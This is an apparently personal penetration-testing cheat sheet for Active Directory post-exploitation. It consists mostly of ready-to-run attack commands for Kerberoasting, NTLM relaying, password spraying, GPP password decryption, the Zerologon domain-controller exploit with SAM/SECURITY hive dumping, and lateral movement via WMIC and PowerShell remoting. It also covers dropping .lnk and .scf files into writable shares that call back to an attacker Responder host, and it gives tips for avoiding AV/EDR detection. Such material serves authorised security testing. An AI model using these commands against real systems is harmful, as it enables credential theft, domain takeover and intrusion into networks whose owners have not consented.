# Basics on what to do upon getting shell/rce


**Note:** Try as much as possible to [Live off the land](https://lolbas-project.github.io/)
## Good blogs for these:
* [BHIS - Finding Buried Treasure SMB](https://www.blackhillsinfosec.com/finding-buried-treasure-in-server-message-block-smb/)

___

## Just basic stuff

```batch
whoami /all
hostname
ipconfig /all
systeminfo
query user
qwinsta
gpresult /R 
dir
tree /f /a
tasklist /V
net user
net user /domain
net user <username>
net user <username> /domain
net localgroup
net localgroup administrators
net groups /domain
net group "<group>" /domain
net group "domain admins" /domain
klist
```
___
## NLTest[^1]
       
```batch
nltest /dclist:<domain>
nltest /dsgetdc:<domain>
nltest /domain_trusts /all_trusts
```
___
## Powershell Enumeration[^1]

```powershell        
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', '<domain>')))).GetAllTrustRelationships()
```
___ 

## [Dumping credentials](./Post_Exploitation.html#dumping-credentials1)
___
## Bloodhound (Sharphound)[^2] 

1. On local machine  (~Kali)
    * Bloodhound Installation[^19]
    * Running bloodhound ingestor from linux:
```batch
cd /opt
git clone https://github.com/fox-it/BloodHound.py
cd BloodHound.py
sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
# bloodhound-python -d domain.local -u user01 -p P@ssw0rd -c all,loggedon --zip
```

1. Sharphound Officialy supported ingestors [^3][^4]
    * Running the official/supported Sharphound Collectors collects more information [
        * although Bloodhound.py is quick and good for most cases
    * Running on the victim host
        ```batch
        .\SharpHound.exe -c all --encryptzip --nosavecache --zipfilename bh.zip -d domain.local
        ```
    * Runas
        * If logged in on a local user account but have domain user credentials, then on the command-line
        * This works also to get SharpHound to work and ingest data even if your own Windows VM is not part of the Domain.
            * This bypasses the need to run SharpHound on the host itself with AVs/ERDs
        ```powershell
        C:\> runas /netonly /user:<DOMAIN>\<username> "powershell.exe -exec bypass"
 
        # then on the spawned powershell
        .\SharpHound.exe -c all --nosavecache --zipfilename bh.zip -d domain.local
        ```
    * Run after sharphound for some nice statistics
        * [Bloodhound Quickwin](https://github.com/kaluche/bloodhound-quickwin)   
    * Mass import owned users in Bloodhound[^14]
        * Sample format of text file to import
            ```
            bob@acme.local
            alice@acme.local
            accounting@acme.local
            trainee3@acme.local
            ```
        * Command. Make sure bloodhound (& neo4j) is already running and credentials are correct:
            ```
            python3 max.py -u neo4j -p neo4j mark-owned -f ~/Results/Dump/owned_users.txt --add-note "from secretsdump and weak passwords"
            ```
    * Bloodhound attacks
        * GenericAll [^15]
            * Although the commands in the reference work, I found that it was easier to modify permissions and other actions (reset user password) using RSAT.
            * If you're Windows attacking VM is connected to the network, just [run mmc as a domain user](./Initial_Foothold.html#rsat) (provided you already have the domain user's credentials). 
            
---
## NTLM Relaying
* Basic NTLM Relay
    * Gather NTLM Relay list using crackmapexec
        * `crackmapexec smb --gen-relay-list relay_list.txt company_internal_subnets.txt`
```bash
sudo impacket-ntlmrelayx -socks -smb2support -of output.txt -tf ./relay_list.txt -c ipconfig
sudo responder -I eth1 -Pvd
```
---
## General Attack methods
* Methods [^5][^6]
     * NTLM Relay[^18]
     * Golden Ticket
         * Requires full domain compromise.
         * Used for persistenceand pivoting
     * Kerberoasting
         * Requires access as any user. 
         * Use to escalateand pivot
     * Silver Ticket
         * Requires service hash.
         * Use for persistenceand escalation
     * Pass-the-Ticket
         * Requires access as user.
         * Use to pivot
     * Over-Pass-the-Hash
         * Requires access as user.
         * Use to pivot
___

## Kerberoasting
1. From Linux [^1][^7]
    * Beware of time difference of the attacking machine (Kali) and the targeted Domain Controller
    ```bash
    GetUserSPNs.py -debug -request -outputfile TGS_file.txt -dc-ip <DC_IP_Address> <FQDN>/<username>
    ```

1. From Windows
    * [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
        ```powershell
        Invoke-Kerberoast -Domain domain.com -OutputFormat hashcat
        ```
        * Getting SPN ticekts of from an external external forest
            * Works if there is trust towards the domain you are in
            ```powershell
            Get-DomainSPNTicket <SERVICE>/DC01.domain-external.com@domain-external.com
            ```


[Password Cracking](../Password_Cracking/Hashcat_general_cheatsheet.html)
    * Refer to [m0chan's blog](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
    ```batch
    hashcat64.exe -a 3 -m 13100 SPN.hash /wordlists/rockyou.txt
    ```

___

## Gathering Windows GPP passwords[^8]

1. On target machine logged-on with a regular domain account
    ```batch
    findstr /S cpassword \\<domain_controller>\sysvol\*.xml
    ```
1. On local machine (~Kali)
    ```bash
    gpp-decrypt <cpassword_value>
    ```

___

## ADFind[^9]
```batch
adfind.exe -f objectclass=trusteddomain
adfind.exe -sc trustdmp
```

---
## ADRecon[^10]
```powershell
# On your own Windows VM after "runas" command
.\ADRecon.ps1 -Method LDAP -DomainControler dc01.acme.local -Credential ACME\user01
```

---
## RSAT
* Run RSAT from a non-domain joined PC
```batch
runas /netonly /user:<DOMAIN>\<username> "mmc /server=<DC or domain>"
runas /netonly /user:ACME\bob.normal.user "mmc /server=dc01.acme.local"
```


---
## Domain Password Spraying
### Dafthack's DomainPasswordSpray[^11]
* Retrieves the list of domain users, sprays and attempts to detect lockout threshold of a user and stops spraying
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2017
```

---

## Find interesting Domain Share Files[^12]
* Find-InterestingDomainShareFile
    ```powershell
    Find-InterestingDomainShareFile
    ```
* Snaffler
    ```batch
    runas /netonly /user:domain.local\victim01 cmd.exe
    snaffler.exe -s -o snaffler_.log
    ```
* Crackmapexec
    * Also refer to [this](./Post_Exploitation.html#looking-for-files-in-the-domain)
    ```bash
    crackmapexec smb -d domain.local -u victim01 -p P@ssw0rd -M spider_plus
    ```

---
## Direct Attacks to the Domain Controller
### Zerologon [^16][^17]
* Resets machine account of vulnerable domain controller
    * Remember to restore the password after

```bash
python3 zerologon_tester.py dc02 10.10.10.20 # From securaBV
 
python3 cve-2020-1472-exploit.py dc02 10.10.10.20 # From dirkjanm
 
secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20 # From impacket
```

* Password restoration process
```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
cd Windows/temp
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
 
smbclient \\\\10.10.10.20\\c$ -U 'acme.local\\administrator%2b576acbe6bcfda7294d6bd18041b8fe' --pw-nt-hash
cd Windows/temp
get system.save
get security.save
get sam.save
 
 
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
cd Windows/temp
del system.save
del security.save
del sam.save
 
 
secretsdump.py -sam sam.save -system system.save -security security.save local
 
python3 restorepassword.py acme.local/dc02@dc02 -target-ip 10.10.10.20  -hexpass ef464f4194d9f401af41c9982dc7c85524cc9ed8adef4fe24c8044d13f1ae41c594131d2d46cab3a0d3384cda94baae65d5a87d26df1201ff6ff1697672ac4e16c16f0e514f6e54d84342c5af4193fe96329e3a30fb84c08845e7a289749225276c7c2e3181555fa5eef21d4d1ba23aba0f4706383327b299283f72b7df6b661cfb11189bd8b3ab552ffb99aa12ffe19b760e00e143ef3e776d8377da57925c5ed71aa9f0991acff7fc9c963addb8496fdd273f231e15a51d99f41a770de714573b26795c45a03eac80e3bb45ac5c100740da5814c3979e5349e8471623086c80f6160163f4bd56da3b75a6deb17b1020 # From dirkjanm
 
secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20
```

---
## Pivoting
### Executing Commands Remotely
#### PsExec


#### Powershell Remote Session (PSRemote)

* "Usual" requirement is that you must be in the same subnet as the machine you are connecting to
* Create a session
    * Without specified credentials
        ```powershell
        New-PSSession dc01.domain.com
        $s = New-PSSession dc01.domain.com
        ```
    * Create a session with credentials
        ```powershell
        $cred = get-credential
        New-PSSession dc01.domain.com –Credential $cred
        ```
* Run commands remotely via PSSession
    ```powershell
    Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1
    ```
* Interactive PSSession
    ```powershell
    Enter-PSSession -Id <#>
    ```
* Exit PSSession
    ```powershell
    Remove-PSSession -Id <#>
    ```

#### Windows Remote Management
```batch
winrs -r:DC01.domain.com cmd
```

#### WMIC
* Run a DLL file remotely using `wmic` via `installutil`[^15]
    ```powershell
    wmic /node:dc01.domain.com process call create "cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll"
    ```
#### Creating lnk file in writable shares
* None opsec safe
* In my experience, IT noticed randomly generated folder names (not necessarily a file)
* Still good to be inserted in phishing email attachments and USB drops (combine with knary)
```
crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M slinky -o SERVER=<ATTACKER_RESPONDER_IP> NAME=Microsoft_UpdateLnk
crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M scuffy -o SERVER=<ATTACKER_RESPONDER_IP> NAME=Microsoft_UpdateScf
```

[^1]: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
[^2]: [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
[^3]: [Github - Bloodhound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
[^4]: [ReadTheDocs - Bloodhound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
[^5]: [Red Siege](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
[^6]: [Orange Cyberdefense](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
[^7]: [Tarlogic Security](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
[^8]: [Pure Security](https://pure.security/dumping-windows-credentials/)
[^9]: [Redcanary](https://redcanary.com/threat-detection-report/techniques/domain-trust-discovery/)
[^10]: [Github - ADRecon](https://github.com/adrecon/ADRecon)
[^11]: [Guthub - DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
[^12]: [Readthedocs - Powersploit](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/)
[^13]: [Move Aside Script Kiddies–Malware Execution in the Age of Advanced Defenses | Joff Thyer](https://www.youtube.com/watch?v=wTmQ5FaRmf4)
[^14]: [Github - Knavesec - Max](https://github.com/knavesec/Max)
[^15]: [Bloodhound - GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall)
[^16]: [Github -  SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
[^17]: [Github - dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
[^18]: [TrustedSec - Comprehensive Guide on NTLM Relaying 2022](https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/)
[^19]: [Readthedocs - Bloodhound](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
[^20]: [Twitter - mpgn](https://twitter.com/mpgn_x64/status/1508781519430692864)
